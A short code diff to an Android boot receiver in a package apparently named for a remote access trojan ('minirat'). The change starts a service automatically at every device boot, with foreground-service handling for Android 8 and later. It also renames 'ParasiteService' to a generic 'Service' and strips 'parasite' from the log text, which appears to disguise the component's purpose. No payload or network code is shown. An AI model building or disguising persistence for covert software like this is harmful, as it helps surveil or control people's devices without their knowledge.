@@ -3,6 +3,7 @@ package com.app.minirat;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.os.Build;
 import android.util.Log;
 
 public class BootReceiver extends BroadcastReceiver {
@@ -16,11 +17,16 @@ public class BootReceiver extends BroadcastReceiver {
                 "android.intent.action.QUICKBOOT_POWERON".equals(action) ||
                 "com.htc.intent.action.QUICKBOOT_POWERON".equals(action)) {
 
-            Log.d(TAG, "Device booted, starting parasite service");
+            Log.d(TAG, "Device booted, starting service");
 
-            // Start the parasite service
-            Intent serviceIntent = new Intent(context, ParasiteService.class);
-            context.startService(serviceIntent);
+            Intent serviceIntent = new Intent(context, Service.class);
+
+            // Use startForegroundService on Android 8+ (required for background service starts)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                context.startForegroundService(serviceIntent);
+            } else {
+                context.startService(serviceIntent);
+            }
         }
     }
 }
